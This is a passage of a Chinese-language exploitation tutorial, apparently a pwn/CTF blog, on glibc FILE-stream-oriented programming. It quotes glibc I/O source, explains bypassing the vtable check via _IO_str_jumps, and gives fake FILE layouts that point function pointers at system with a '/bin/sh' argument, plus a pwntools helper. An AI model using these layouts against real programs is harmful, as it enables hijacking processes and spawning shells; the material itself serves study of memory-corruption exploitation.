class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_flush_all_lockp (<span class=\"type\">int</span> do_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (fp != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">       ...</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<span class=\"comment\">//伪造的IO_FILE要满足的条件</span></span><br><span class=\"line\">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) </span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">               result = EOF;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">       fp=fp-&gt;_chain;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从上面代码可以看到，要执行<code>_IO_overflow(fp)</code>，伪造的IO_FILE需要满足以下条件：</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>\n<ol>\n<li>当 libc检测到<strong>内存错误</strong>， 执行 abort 流程时（可以通过malloc等函数触发）（glibc-2.26删除）</li>\n<li>当执行 exit 函数时</li>\n<li>当执行流从 main 函数返回时</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">._chain = chunk_addr <span class=\"comment\">//伪造_chain</span></span><br><span class=\"line\">chunk_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"string\">&quot;/bin/sh\\x00&quot;</span>, <span class=\"comment\">//对应此结构体首地址(fp)</span></span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x1</span>,</span><br><span class=\"line\">      ...</span><br><span class=\"line\">      _mode = <span class=\"number\">0x0</span>, <span class=\"comment\">//一般不用特意设置</span></span><br><span class=\"line\">      _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = heap_addr</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">heap_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __overflow = system_addr,</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"glibc2-24后的IO-FILE利用\"><a href=\"#glibc2-24后的IO-FILE利用\" class=\"headerlink\" title=\"glibc2.24后的IO_FILE利用\"></a>glibc2.24后的IO_FILE利用</h2><p>从glibc2.24开始，加入了对vtable的检查，会对vtable的合法性进行检查。glibc中有一段完整的内存存放着各个vtable，<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code> 分别指向第一个和最后一个vtable，只有其中的vtable和外部的合法vtable可以通过检查正常使用，否则会引发abort。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class=\"line\"><span class=\"comment\">   terminate the process.  */</span></span><br><span class=\"line\"><span class=\"type\">void</span> _IO_vtable_check (<span class=\"type\">void</span>) attribute_hidden;</span><br><span class=\"line\"><span class=\"comment\">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class=\"line\"><span class=\"comment\">   the process.  */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *<span class=\"title function_\">IO_validate_vtable</span> <span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *vtable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class=\"line\"><span class=\"comment\">     section.  */</span></span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> ptr = (<span class=\"type\">uintptr_t</span>) vtable;</span><br><span class=\"line\">  <span class=\"type\">uintptr_t</span> offset = ptr - (<span class=\"type\">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class=\"line\">    <span class=\"comment\">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class=\"line\"><span class=\"comment\">       slow path, which will terminate the process if necessary.  */</span></span><br><span class=\"line\">    _IO_vtable_check ();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> vtable;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个检查的调用流程如下（IO函数使用宏调用）：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) <span class=\"comment\">//检查在这里</span></span></span><br></pre></td></tr></table></figure>\n\n<p>在调用vtable中函数时会对其vtable合法性进行检查。</p>\n<p>因此我们伪造的<code>vtable</code>要在<code>glibc</code>的<code>vtable</code>段中，从而得以绕过该检查。<br>目前来说，有四种思路：利用<code>_IO_str_jumps</code>中<code>_IO_str_overflow()</code>函数和<code>_IO_str_finish()</code>函数与利用<code>_IO_wstr_jumps</code>中对应的这两种函数。</p>\n<h3 id=\"IO-str-jumps的FSOP-2-28及以后失效\"><a href=\"#IO-str-jumps的FSOP-2-28及以后失效\" class=\"headerlink\" title=\"_IO_str_jumps的FSOP(2.28及以后失效)\"></a>_IO_str_jumps的FSOP(2.28及以后失效)</h3><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个<code>vtable</code>可以通过对vtable的检查。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_str_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_str_finish), <span class=\"comment\">//this</span></span><br><span class=\"line\">  JUMP_INIT(overflow, _IO_str_overflow), <span class=\"comment\">//this</span></span><br><span class=\"line\">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class=\"line\">  JUMP_INIT(read, _IO_default_read),</span><br><span class=\"line\">  JUMP_INIT(write, _IO_default_write),</span><br><span class=\"line\">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class=\"line\">  JUMP_INIT(close, _IO_default_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>下面是一些相关的结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"> \t_IO_alloc_type _allocate_buffer;</span><br><span class=\"line\"> \t_IO_free_type _free_buffer;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_strfile_</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"> \t<span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span> _<span class=\"title\">sbf</span>;</span></span><br><span class=\"line\"> \t<span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_str_fields</span> _<span class=\"title\">s</span>;</span></span><br><span class=\"line\">&#125; _IO_strfile;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_streambuf</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  FILE _f;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *<span class=\"title\">vtable</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>由于libc中没有_IO_str_jumps的符号，因此需要自己找</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># libc.address = libc_base</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_IO_str_jumps</span>():</span><br><span class=\"line\">    IO_file_jumps_addr = libc.sym[<span class=\"string\">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class=\"line\">    IO_str_underflow_addr = libc.sym[<span class=\"string\">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ref <span class=\"keyword\">in</span> libc.search(p64(IO_str_underflow_addr-libc.address)):</span><br><span class=\"line\">        possible_IO_str_jumps_addr = ref - <span class=\"number\">0x20</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> possible_IO_str_jumps_addr &gt; IO_file_jumps_addr:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> possible_IO_str_jumps_addr</span><br></pre></td></tr></table></figure>\n\n<p>如果能设置vtable为<code>_IO_str_jumps</code>，那就可以调用其中的函数，如果其中的函数有问题，自然就可以利用。</p>\n<hr>\n<p>在<code>_IO_str_jumps</code>中的<code>_IO_str_overflow</code>就有可以利用的地方。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_str_overflow (_IO_FILE *fp, <span class=\"type\">int</span> c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> flush_only = c == EOF;</span><br><span class=\"line\">  _IO_size_t pos;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class=\"comment\">// pass</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> flush_only ? <span class=\"number\">0</span> : EOF;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class=\"comment\">// should in </span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class=\"comment\">/* not allowed to enlarge */</span> <span class=\"comment\">// pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">char</span> *new_buf;</span><br><span class=\"line\">      <span class=\"type\">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">      <span class=\"type\">size_t</span> old_blen = _IO_blen (fp);</span><br><span class=\"line\">      _IO_size_t new_size = <span class=\"number\">2</span> * old_blen + <span class=\"number\">100</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_size &lt; old_blen)<span class=\"comment\">//pass 一般会通过</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">      new_buf</span><br><span class=\"line\">        = (<span class=\"type\">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class=\"comment\">//target [fp+0xe0]</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_buf == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"comment\">/*      __ferror(fp) = 1; */</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (old_buf)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class=\"line\">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class=\"line\">          <span class=\"comment\">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class=\"line\">          fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"built_in\">memset</span> (new_buf + old_blen, <span class=\"string\">&#x27;\\0&#x27;</span>, new_size - old_blen);</span><br><span class=\"line\"></span><br><span class=\"line\">      _IO_setb (fp, new_buf, new_buf + new_size, <span class=\"number\">1</span>);</span><br><span class=\"line\">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class=\"line\">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class=\"line\"></span><br><span class=\"line\">      fp-&gt;_IO_write_base = new_buf;</span><br><span class=\"line\">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!flush_only)</span><br><span class=\"line\">    *fp-&gt;_IO_write_ptr++ = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) c;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>\n\n<p>利用下面语句可以劫持程序流程：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_buf= (<span class=\"type\">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>\n\n<p>思路是绕过前面的检查，并将<code>fp-&gt;_s._allocate_buffer</code>修改为<code>system</code>,将<code>new_size</code>修改为<code>&quot;/bin/sh&quot;</code>的地址（也可直接改为one_gadget）</p>\n<p>具体构造：</p>\n<ol>\n<li><code>fp-&gt;_flags &amp; _IO_NO_WRITES</code>为假</li>\n<li><code>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></li>\n<li><code>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)</code>为假</li>\n<li><code>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 </code>不能为负数</li>\n<li><code>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</code>; 应当指向/bin/sh字符串对应的地址</li>\n<li><code>fp+0xe0</code>（<code>_allocate_buffer</code>）指向system地址</li>\n</ol>\n<p>当然也要绕过 <code>_IO_flush_all_lockp</code>的一些条件</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">._chain =&gt; chunk_addr</span><br><span class=\"line\">chunk_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x1</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = (bin_sh_addr - <span class=\"number\">100</span>) <span class=\"comment\">// 2,</span></span><br><span class=\"line\">      ...</span><br><span class=\"line\">      _mode = <span class=\"number\">0x0</span>, <span class=\"comment\">//一般不用特意设置</span></span><br><span class=\"line\">      _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = _IO_str_jumps <span class=\"comment\">//chunk_addr + 0xd8 ~ +0xe0(glibc2.24之前可以)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">+<span class=\"number\">0xe0</span> ~ +<span class=\"number\">0xe8</span> : system_addr / one_gadget <span class=\"comment\">//fp-&gt;_s._allocate_buffer</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>在<code>_IO_str_jumps</code>中的<code>_IO_str_finish</code>也可以利用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_str_finish (_IO_FILE *fp, <span class=\"type\">int</span> dummy)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class=\"line\">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class=\"comment\">//[fp+0xe8]</span></span><br><span class=\"line\">  fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_default_finish (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同样也是对其中函数指针的利用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class=\"comment\">//[fp+0xe8]</span></span><br></pre></td></tr></table></figure>\n\n<p>绕过条件：</p>\n<ol>\n<li>_IO_buf_base 不为空</li>\n<li>_flags &amp; _IO_USER_BUF(0x01) 为假，即flag字段不包含IO_USER_BUF</li>\n</ol>\n<p>现在要让程序执行 <code>_IO_str_finish</code> ，<code>fclose(fp)</code> 是一条路，但似乎有局限。还是回到异常处理的方法，在 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW</code> 执行的 <code>__GI__IO_str_overflow</code>，而 <code>_IO_OVERFLOW</code> 是根据 <code>__overflow</code> 相对于 <code>_IO_str_jumps</code> vtable 的偏移找到具体函数的。所以如果我们伪造传递给 <code>_IO_OVERFLOW(fp)</code> 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 <code>_IO_str_finish</code> 并执行。</p>\n<p>也就是说，如果设置的vtable是<code>_IO_str_jumps-0x8</code>，那么在<code>vtable+0x18</code>的位置就是 <code>_IO_str_finish</code>（原本应该是 <code>_IO_str_overflow</code>），这样就可以通过 <code>_IO_flush_all_lockp</code>执行到 <code>_IO_str_finish</code>，而且由于这个vtable在合法范围内，因此能过检测。</p>\n<p>不过我们也要绕过 <code>_IO_flush_all_lockp</code>的一些条件</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>构造如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">._chain =&gt; chunk_addr</span><br><span class=\"line\">chunk_addr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span 